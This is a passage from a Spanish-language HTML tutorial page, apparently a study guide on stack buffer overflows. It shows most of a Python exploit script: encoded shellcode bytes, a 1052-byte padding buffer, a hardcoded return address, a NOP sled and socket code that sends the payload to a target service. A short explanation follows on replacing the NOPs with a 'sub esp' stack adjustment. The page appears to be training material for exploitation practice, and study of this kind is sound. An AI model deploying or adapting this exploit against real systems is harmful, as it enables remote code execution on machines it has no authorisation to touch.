shellcode += b&quot;\x55\x72\xf5\xcc\x0b\xd2\x2a\xda\x41\x4d\x5f\x4f\xb4&quot;
shellcode += b&quot;\x2f\xbb\xc6\x88\x45\x5f\x3e\x11\x08\x86\x09\x5d\xe7&quot;
shellcode += b&quot;\xf8\x11\x49\x5c\x12\xdc\x8e\x66\xa0\x1e\x1c\x10\x0a&quot;
shellcode += b&quot;\xf8\xa7\xac\x6b\x8d\xd4\x2a\xaa\xe6\x5e\x9d\xbe\x04&quot;
shellcode += b&quot;\x42\x52\xe0\x71\x86\xc5\xa6\xa2\xff\xdf\xcb\x75\x28&quot;
shellcode += b&quot;\x2f\x5b\x05\x57\x39\x45\xd2\x7e\x05\xd6\x91\xfd\x46&quot;
shellcode += b&quot;\x2c\x31\x66\xea\xbe\x3c\xc8\x10\x96\xf6\xcc\x31\xbc&quot;
shellcode += b&quot;\x56\x43\x24\x1f\x86\xed\xf2\x59\xa2\x38\x9c\x4f\xa1&quot;
shellcode += b&quot;\xc6\x58\x71\xb7\x81\x9d\xe3\x25\xb7\xc7\xf4\x5c\xa3&quot;
shellcode += b&quot;\x01\xd4\x5e\xf2\x1d\x92\x57\x08\x65\xd9\x62\xdf\xb4&quot;
shellcode += b&quot;\xdf\xaa\xb8\x6a\x61\x82\x87\xfa\x27\x0c\xe9\x49\x46&quot;
shellcode += b&quot;\xea\x50\x51\xb6\x6b\xc9\xbc\xe4\x95\xff\xf8\x36\x94&quot;
shellcode += b&quot;\x3b\xbd\x24\xd9\x9c\xb5\x1e\x77\xcb\x31\x84\x2a\xe3&quot;
shellcode += b&quot;\xca\xac\xd7\x8c\x12\xed\xa0\x53\xfa\xbc\x94\xf3\x9b&quot;
shellcode += b&quot;\xe5\x8a\xac\xf3\x48\x1a\x39\x2e\x63\x5a\x68\xe9\x85&quot;
shellcode += b&quot;\x93\xde\x3a\x22\x77\x2a\xac\xa1\xfa\x96\x7f\x9f\x95&quot;
shellcode += b&quot;\x6f\xa3\xe4\x13\x41\x9a\xe8\xf6\x97\x6b\x2d\x31\x68&quot;
shellcode += b&quot;\x9c\xb1\x2f\xab\xa3\xf5\x56\xe9\xf5\xa3\x21\xe9\x9c&quot;
shellcode += b&quot;\x19\xaf\x10\x57\xfb\x80\x0e\x73\x48\x84\xb1\xb0\xb0&quot;
shellcode += b&quot;\x83\x67\x88\xb5\x1d\x0e\x73\xeb\xa1\xd1\xdc\xa2\xe9&quot;
shellcode += b&quot;\x76\xcc\xd0\x27\x6b\xed\x5d\xfc\x02\xcb\x8f\xff\xc3&quot;
shellcode += b&quot;\xb2\x8f\xf3\xee\x96\x9a\xec\xb1\x73\x55\x47\x82\x70&quot;
shellcode += b&quot;\x10\x32\x53\xbb\xfa\x83\x38\x3b\xb0\xea\xd1\xe4\x6e&quot;
shellcode += b&quot;\x2f\x7d\x23\xc5\xd9\x5d\xfb\x48\x06\x3d\x4f\x33\xfe&quot;
shellcode += b&quot;\x03\x9c&quot;

if __name__ == &quot;__main__&quot;:
    #buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x83\xEC\x10&quot; + shellcode
    buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x90&quot; * 16 + shellcode
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.send(&quot;%s\r\n&quot; % buffer)
    except Exception as ex:
        print &quot;[!] Ha habido un error de conexion&quot;
        print ex
        sys.exit(1)
</code></pre>
<p><strong>Consideraciones</strong></p>
<p>Si bien se pueden utilizar algunos &quot;trucos&quot; para caer en la dirección donde se encuentra el shellcode como lo son los <code>NOPs (\x90)</code> se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de <code>msf-nasm_shell</code> se puede invocar la instrucción <code>sub esp, &lt;valor en hexadecimal&gt;</code>. Ejemplo:</p>
<p><img src="./images/bof_10.png" alt="OP code de sub" /></p>
<p>En este caso se obtendría el valor <code>83EC10</code> como código de operación para el desplazamiento de 10 unidades. quedando la línea de construcción del payload como: <code>buffer = &quot;A&quot; * 1052 + pack(&quot;&lt;L&quot;, 0x68a98a7b) + &quot;\x83\xEC\x10&quot; + shellcode</code> en lugar de los <code>NOPs</code>.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../guides/port_swigger_academy/sql_injection.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../guides/port_swigger_academy/sql_injection.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
